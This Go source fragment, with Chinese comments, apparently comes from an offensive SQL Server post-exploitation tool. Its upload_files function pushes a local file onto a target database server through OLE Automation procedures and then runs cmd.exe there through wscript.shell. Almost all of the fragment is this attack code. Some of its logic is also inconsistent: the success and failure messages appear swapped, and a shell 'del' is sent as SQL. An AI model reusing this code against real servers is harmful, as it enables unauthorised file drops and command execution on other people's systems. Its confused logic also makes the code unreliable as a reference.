func upload_files() {

	fmt.Printf("[*] Uploading '%s' to '%s'...\n", localFile, remoteFile)

	byteArray, err := readFileToByte(localFile)
	if err != nil {
		log.Fatal(err)
	}

	exists, err := checkFileExists(conn, remoteFile)
	if err != nil {
		log.Fatal(err)
	}
	if exists {
		fmt.Printf("[+] %s Exists\n", remoteFile)
		return
	}

	hexStr := hex.EncodeToString(byteArray)

	sqlStr := fmt.Sprintf(`
		DECLARE @ObjectToken INT
		EXEC sp_OACreate 'ADODB.Stream', @ObjectToken OUTPUT
		EXEC sp_OASetProperty @ObjectToken, 'Type', 1
		EXEC sp_OAMethod @ObjectToken, 'Open'
		EXEC sp_OAMethod @ObjectToken, 'Write', NULL, 0x%s
		EXEC sp_OAMethod @ObjectToken, 'SaveToFile', NULL, '%s', 2
		EXEC sp_OAMethod @ObjectToken, 'Close'
		EXEC sp_OADestroy @ObjectToken`, hexStr, remoteFile)

	_, err = conn.Exec(sqlStr)
	if err != nil {
		log.Fatal(err)
	}

	time.Sleep(1 * time.Second)

	exists, err = checkFileExists(conn, remoteFile)
	if err != nil {
		log.Fatal(err)
	}
	if exists {
		fmt.Printf("[+] %s Uploading ...\n", remoteFile)
	} else {
		fmt.Printf("[!] %s Upload Success\n", remoteFile)
		os.Exit(0)
	}

	text := fmt.Sprintf("copy /b %s", remoteFile)
	shell := fmt.Sprintf(`
		DECLARE @SHELL INT 
		EXEC sp_oacreate 'wscript.shell', @SHELL OUTPUT 
		EXEC sp_oamethod @SHELL, 'run' , NULL, 'cmd.exe /c %s'`, text)

	fmt.Printf("[+] copy /b %s_x.config_txt %s\n", remoteFile, remoteFile)

	_, err = conn.Exec(shell)
	if err != nil {
		log.Fatal(err)
	}

	time.Sleep(1 * time.Second)

	exists, err = checkFileExists(conn, remoteFile)
	if err != nil {
		log.Fatal(err)
	}
	if exists {
		sqlStr := fmt.Sprintf("del %s'", remoteFile)
		fmt.Printf("[+] %s\n", sqlStr)
		_, err = conn.Exec(sqlStr)
		if err != nil {
			log.Fatal(err)
		}
		fmt.Printf("[*] '%s' Upload completed\n", localFile)
	}
}

// 将文件读取为字节数组
func readFileToByte(filename string) ([]byte, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	byteArray, err := ioutil.ReadAll(file)
	if err != nil {
		return nil, err
	}

	return byteArray, nil
}

// 检查文件是否存在
func checkFileExists(conn *sql.DB, filename string) (bool, error) {
	rows, err := conn.Query(fmt.Sprintf("SELECT COUNT(*) FROM sys.sysfiles WHERE name = '%s'", filename))
	if err != nil {
		return false, err
	}
	defer rows.Close()

	var count int
	for rows.Next() {
		err := rows.Scan(&count)
		if err != nil {
			return false, err
		}
	}

	return count > 0, nil
}
